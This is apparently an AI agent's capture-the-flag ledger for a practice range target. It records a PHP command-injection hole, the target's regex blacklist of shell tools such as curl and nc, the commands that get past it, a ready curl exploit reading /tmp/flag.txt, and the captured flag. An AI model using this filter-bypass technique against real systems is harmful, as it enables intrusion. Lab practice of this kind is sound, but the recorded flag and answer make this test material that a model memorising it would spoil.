# CTF 台账 · 好靶场 hbc2（2026-10-20）

> 技能纪律：AI 会话会被压缩，已拿到的 flag 与手法必须落盘。本文件只追加。

## flag 台账

| flag 值 | 来自（机器 / 位置） | 是否已报告 | 时间 |
|---|---|---|---|
| `flag{11519b171bc24ec99afe0c017a2aabfa}` | hbc2.haobachang.com:16516 `/tmp/flag.txt` | ✅ 已报告（16:22） | 16:22 |

## 收口三行

```
目标 | 入口洞 | flag/权限 | 卡点 | 下一步
hbc2.haobachang.com:16516 | POST / 参数 command 直通 shell_exec，黑名单绕过（dd） | flag{11519b171bc24ec99afe0c017a2aabfa} / www-data(uid=82) | 无 | 提交归人工；实例回收后需重拿
```

## 假设台账（已闭合）

| 目标 | 已确认事实 | 已消除的假设 | 存活假设 | 下一步 |
|---|---|---|---|---|
| hbc2.haobachang.com:16516 | nginx 1.20.2 + PHP 7.3.33；POST `command` 回显执行；黑名单 `preg_match('/(\?\*|cat|tac|head|tail|more|less|nl|sort|uniq|od|xxd|hexdump|base32|base64|strings|grep|file|find|cp|mv|wget|curl|nc|ncat)/i')`；cwd=/var/www/html；用户 www-data | `/flag`、`/flag.txt` 根目录不存在；`GZCTF_FLAG`/`FLAG` 环境变量为空；cat/find/head/tail/nl/tac/strings/more/sort 直读全部被拦 | 无 | 已完成（三 agent 独立复核一致） |

**手法要点**（重拿时直接用）：
`curl -X POST http://hbc2.haobachang.com:16516/ --data-urlencode "command=dd if=/tmp/flag.txt"` → 回显 flag。
备选：`awk 1 /tmp/flag.txt`、`rev /tmp/flag.txt`。黑名单没拦的：dd / sed / awk / tr / rev / printf / tee / python / php / ls / id / pwd / echo。
